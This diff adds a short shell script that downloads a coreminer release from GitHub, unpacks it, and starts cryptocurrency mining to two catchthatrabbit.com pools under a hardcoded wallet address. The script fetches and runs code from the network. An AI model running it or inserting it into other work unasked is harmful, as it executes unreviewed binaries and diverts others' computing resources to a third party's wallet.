@@ -1,0 +1,5 @@
+wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.89/coreminer-linux-arm64.tar.gz
+tar xf coreminer-linux-arm64.tar.gz
+cd coreapp
+./coreminer -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
+     -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008
